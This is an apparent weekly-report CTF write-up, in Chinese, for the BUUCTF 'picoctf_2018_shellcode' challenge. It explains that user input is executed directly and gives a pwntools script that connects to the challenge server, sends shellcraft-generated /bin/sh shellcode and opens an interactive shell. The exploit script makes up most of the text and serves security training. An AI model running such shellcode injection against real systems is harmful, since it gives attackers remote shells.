# week5
# BUUCTF-picoctf_2018_shellcode
vuln函数输入shellcode

<img width="208" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/efecac50-593e-40ac-9877-1966868c3ed3">

返回到main函数后输入会被直接执行
### exp_PicoCTF_2018_shellcode.py
```python
from pwn import *
# p = process("./PicoCTF_2018_shellcode")
p = remote("node4.buuoj.cn",27464)
context.log_level = 'debug'
context.arch = 'i386'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

sc = asm(shellcraft.sh())

ru("Enter a string!\n")
sl(sc)

shell()
```
